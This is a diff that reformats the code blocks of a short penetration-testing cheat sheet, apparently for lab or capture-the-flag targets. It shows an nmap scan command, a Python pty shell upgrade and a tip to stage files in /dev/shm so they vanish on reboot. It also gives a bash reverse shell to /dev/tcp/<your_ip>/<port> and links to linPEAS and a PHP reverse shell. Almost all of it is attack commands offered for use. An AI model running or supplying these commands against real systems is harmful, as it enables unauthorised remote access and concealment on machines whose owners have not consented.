@@ -1,12 +1,16 @@
 ## DATA COLLECTION 
 
-```nmap -sV -sC -oA <ip> <outputfile>```
+```nmap
+nmap -sV -sC -oA <ip> <outputfile>
+```
 
 Dirb any available port 80 address
 
 ### TTY SHELL
 
-```python -c 'import pty; pty.spawn("/bin/sh")'```
+```python
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
 
 https://netsec.ws/?p=337
 
@@ -25,7 +29,9 @@ https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh
 
 ## STORE FILES IN MEM
 
-```/dev/shm```
+```dev
+/dev/shm
+```
 
 Upload any files to Ram disk that will clear on reboot.
 
@@ -39,7 +45,9 @@ https://github.com/pentestmonkey/php-reverse-shell
 
 ## BASH RS
 
-```bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'```
+```bash
+bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'
+```
 
 ## Powershell
 
